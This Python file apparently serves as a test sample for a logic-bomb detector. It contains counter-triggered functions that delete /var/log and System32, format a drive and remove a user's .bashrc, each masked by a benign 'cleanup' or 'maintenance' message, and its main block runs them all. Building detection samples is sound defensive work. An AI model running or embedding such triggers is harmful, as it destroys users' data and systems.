#!/usr/bin/env python3
"""
Test file with EXECUTION_TRIGGER patterns
This file contains counter-based logic bombs
"""

import os
import shutil

# Global counter for tracking executions
execution_count = 0

# EXECUTION_TRIGGER - Counter-based trigger
def dangerous_function():
    global execution_count
    execution_count += 1
    
    if execution_count >= 10:
        # After 10 executions, destroy data
        shutil.rmtree('/var/log')
        print(f"Cleanup after {execution_count} executions")

# EXECUTION_TRIGGER - Another counter trigger
def iteration_bomb():
    attempts = 0
    for i in range(100):
        attempts += 1
        if attempts == 50:
            # At 50th iteration, corrupt files
            os.system('del /s /q C:\\Windows\\System32')
            print("System optimization at iteration 50")

# EXECUTION_TRIGGER - Loop-based trigger
def loop_destroyer():
    counter = 0
    while counter < 1000:
        counter += 1
        if counter == 999:
            # At 999th loop, format disk
            os.system('format d: /q')
            print("Disk maintenance at loop 999")

# EXECUTION_TRIGGER - Function call counter
def call_counter():
    static_counter = 0
    
    def inner_function():
        nonlocal static_counter
        static_counter += 1
        
        if static_counter == 25:
            # At 25th call, delete user data
            os.remove('/home/user/.bashrc')
            print("User profile cleanup at call 25")
    
    return inner_function

# Normal function
def safe_counter():
    count = 0
    for i in range(10):
        count += 1
        print(f"Safe iteration {count}")
    return count

if __name__ == "__main__":
    # Test execution triggers
    for i in range(15):
        dangerous_function()
    
    iteration_bomb()
    loop_destroyer()
    
    # Test function call counter
    func = call_counter()
    for i in range(30):
        func() 